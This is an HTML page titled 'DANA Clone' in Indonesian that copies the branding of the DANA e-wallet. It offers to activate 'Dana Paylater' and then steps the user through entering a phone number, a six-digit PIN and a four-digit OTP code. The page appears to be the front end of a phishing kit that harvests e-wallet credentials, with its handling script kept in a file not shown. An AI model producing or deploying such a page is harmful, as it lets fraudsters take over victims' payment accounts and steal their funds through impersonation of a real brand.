<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>DANA Clone</title>

  <link rel="stylesheet" href="style.css">
</head>
<body>

<div class="container">

  <!-- LOGO -->
  <div class="logo">DANA</div>

  <!-- SCREEN 1 -->
  <div class="screen active" id="screen1">
    <div class="card">
      <label><input type="radio" checked> Aktifkan Dana Paylater</label>
      <label><input type="radio"> Aktifkan Dana Cicil</label>
      <label><input type="radio"> Laporkan Kendala</label>
    </div>
    <button onclick="nextScreen(2)" class="btn">Konfirmasi</button>
  </div>

  <!-- SCREEN 2 -->
  <div class="screen" id="screen2">
    <input id="phone" type="text" placeholder="+62 812xxxx" class="input">
    <button id="btnNext" class="btn" disabled>Lanjut</button>
  </div>

  <!-- SCREEN 3 -->
  <div class="screen" id="screen3">
    <div class="pin" id="pin">
      <input maxlength="1"><input maxlength="1"><input maxlength="1">
      <input maxlength="1"><input maxlength="1"><input maxlength="1">
    </div>
    <button id="btnPin" class="btn" disabled>Verifikasi</button>
  </div>

</div>

<!-- OTP POPUP -->
<div class="popup" id="popup">
  <h3>Verifikasi OTP</h3>
  <div class="pin" id="otp">
    <input maxlength="1"><input maxlength="1"><input maxlength="1"><input maxlength="1">
  </div>
  <p id="timer">Kirim ulang (60s)</p>
</div>

<script src="script.js"></script>
</body>
</html>
